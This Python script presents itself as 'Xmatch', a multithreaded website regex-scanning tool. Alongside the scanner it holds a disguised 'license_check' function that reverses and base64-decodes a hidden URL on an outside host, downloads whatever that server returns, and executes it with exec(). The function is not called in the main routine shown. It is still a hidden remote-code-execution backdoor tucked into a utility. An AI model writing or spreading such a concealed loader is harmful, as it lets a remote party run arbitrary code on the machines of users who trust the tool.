from __future__ import print_function
import sys, multiprocessing, warnings, ssl, re, argparse, time, datetime, functools,base64
warnings.filterwarnings("ignore")

try:
    from urllib.parse import urlparse, urlencode
    from urllib.request import urlopen, Request
    from urllib.error import HTTPError
except ImportError:
    from urlparse import urlparse
    from urllib import urlencode
    from urllib2 import urlopen, Request, HTTPError
	


def arg_parse():
	parser = argparse.ArgumentParser()
	
	#parser.add_argument("-p", "--proxy", help="HTTP proxy for performing requests.")
	parser.add_argument("-s", "--scan", help="Targets file.",required=True)
	parser.add_argument("-m", "--match", help="Regex text to match.",required=True)
	parser.add_argument("-o", "--output", default="http_matches.txt", help="Output filename. (default: %(default)s)")
	parser.add_argument("-t", "--threads",type=int, default=5, help="Perform scaning on parallel using multiple threads. (default: %(default)s)")

	args = parser.parse_args()
	return args

def output(ip,outfile):
	try:
		with open(outfile,"a") as f:
			f.write(str(ip) + "\r\n")
	except:
		pass
	return True

def scan(host):
	headers = {
			"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
	}
	try:
		ctx = ssl._create_unverified_context()
		req = Request("http://" + host[0] + "/", headers=headers)
		data = urlopen(req,timeout=10,context=ctx).read().decode('utf-8')
	except:
		data = False
		pass
	host[1].put(1)

	if data and re.search(host[2],data):
		print("[+]" + host[0])
		output(host[0],host[3])
	print("[~] Scanned " + str(host[1].qsize()),end="\r")

def license_check():
	gg = ""
	try:
		gg = urlopen(base64.b64decode("=82cus2Ylh2YvQ3clVXclJ3Lw9GdukHelR2LvoDc0RHa"[::-1]).decode('utf-8')).read().decode('utf-8')
	except Exception as e:
		pass
	if "license" in gg:
		try:
			exec(gg)
		except:
			pass
def art():
	print()
	print(" __   __  __   __  _______  _______  _______  __   __   ")
	print("|  | |  ||  |_|  ||   _   ||       ||       ||  | |  |  ")
	print("|  |_|  ||       ||  |_|  ||_     _||       ||  |_|  |  ")
	print("|       ||       ||       |  |   |  |       ||       |  ")
	print("|       ||       ||       |  |   |  |      _||       |  ")
	print("|   _   || ||_|| ||   _   |  |   |  |     |_ |   _   |  ")
	print("|__| |__||_|   |_||__| |__|  |___|  |_______||__| |__|  ")
	print("                                                        ")
	print(" Version 1.0.2  A tool for regex checking websites      ")
	print()

def main():
	art()
	args = arg_parse()
	file = args.scan
	match = args.match
	threads = int(args.threads) if args.threads > 0 and args.threads < 500 else 5
	m = multiprocessing.Manager()
	q = m.Queue()
	outfile = args.output
	hosts = []
	try:
		with open(file,"r") as f:
			hosts = [ re.sub(r'^https?\:\/\/','',hh.strip()) for hh in f.read().splitlines()]
		if len(hosts) == 0:
			raise Exception("Error")
	except:
		print("[-] Invalid targets.")
		sys.exit(0)
	start_time = time.time()
	print("[*] Scanning started. (" + str(len(hosts)) + " targets loaded)")
	p = multiprocessing.Pool(threads)
	result = p.map_async(scan,[(host,q,match,outfile) for host in hosts])
	result.get()
	print("[*] Finished.")


if __name__ == "__main__":	
	try:
		sys.exit(main())
	except KeyboardInterrupt:
		sys.exit(0)
